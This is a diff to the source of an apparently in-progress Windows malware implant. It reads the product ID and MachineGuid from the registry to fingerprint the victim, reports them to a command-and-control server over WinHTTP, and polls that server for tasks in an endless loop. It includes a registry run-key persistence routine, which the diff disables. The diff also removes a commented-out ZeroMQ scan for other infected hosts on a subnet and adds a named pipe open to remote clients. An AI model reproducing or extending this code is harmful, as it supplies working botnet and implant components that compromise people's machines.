@@ -23,7 +23,7 @@
 #include <tlhelp32.h>
 #include <dirent.h>
 #include <iphlpapi.h>
-#include <zmq.h>
+#include <string>
 
 // Use iphlpapi to get interface info
 void NetworkInterfaces(){
@@ -59,6 +59,14 @@ wchar_t* ProductID(){
 	DWORD size = 30*sizeof(wchar_t);
 	RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), TEXT("ProductId"), RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
     return value;
+}
+
+// Identify system using product ID
+std::wstring MachineGUID(){
+    wchar_t* value = (wchar_t*)malloc(255*sizeof(wchar_t));
+	DWORD size = 255*sizeof(wchar_t);
+	RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Cryptography"), TEXT("MachineGuid"), RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
+    return std::wstring(value, (int)size);
 }
 
 // Retrieve computer name
@@ -140,7 +148,7 @@ void RegisterC2(){
             );
             
             if(request){
-                wchar_t* headers = L"Content-Type: application/json\r\n";
+                std::wstring headers(L"Content-Type: application/json\r\n");
                 char* jsonData = (char*) malloc(512);
                 wchar_t* productID = ProductID();
                 wchar_t* OSRelease = OSName();
@@ -152,7 +160,7 @@ void RegisterC2(){
 
                 BOOL result = WinHttpSendRequest(
                     request, 
-                    headers,
+                    headers.c_str(),
                     -1,
                     jsonData,
                     size,
@@ -256,6 +264,7 @@ wchar_t* GetTasks(){
         printf("%d\n", GetLastError());
     }
     WinHttpCloseHandle(session);
+    return (wchar_t*)NULL;
 }
 
 // Add registry run key for local user to boot this executable at startup
@@ -275,7 +284,7 @@ int _tmain(int argc, _TCHAR *argv[]){
     if(argc == 1){
         // Report intrusion to C2
         RegisterC2();
-        PersistMe();
+        //PersistMe();
         // Periodically check for new commands from C2
         while(1){
             wchar_t* tasks = GetTasks();
@@ -286,34 +295,14 @@ int _tmain(int argc, _TCHAR *argv[]){
         }
     }
 
-    /*
-
-    // Establish peer network
-    // Create a router for recieving messages
-    void* context = zmq_ctx_new();
-    void* router = zmq_socket(context, ZMQ_ROUTER);
-    int success = zmq_bind(router, "tcp://*:8889");
-    if (success != 0){
-
-    }
-
-    // Scan network for other infected machines
-    // Brute force method
-    void* dealer = zmq_socket(context, ZMQ_DEALER);
-    for(int address = 1; address < 255; address++){
-        zmq_connect(dealer, "tcp://192.168.56.%d:8889", address);
-    }
-
-
-    // Timed loop for checking potential peers and retrieving commands from c2
-    while(1){
-        // Read router activity
-        _TCHAR* buffer = malloc(64*sizeof(char));
-        zmq_recv(router, buffer, 64, 0);
-        printf("Incoming message: %s", buffer);
-        Sleep(10000);
-        zmq_send(dealer, buffer, 64, 0);
-    }
-
-    */
+    HANDLE hServer = CreateNamedPipeW(
+        L"\\\\.\\talktome",
+        (PIPE_ACCESS_INBOUND | FILE_FLAG_FIRST_PIPE_INSTANCE),
+        (PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_ACCEPT_REMOTE_CLIENTS),
+        1,
+        2048,
+        2048,
+        0,
+        NULL
+    );
 }
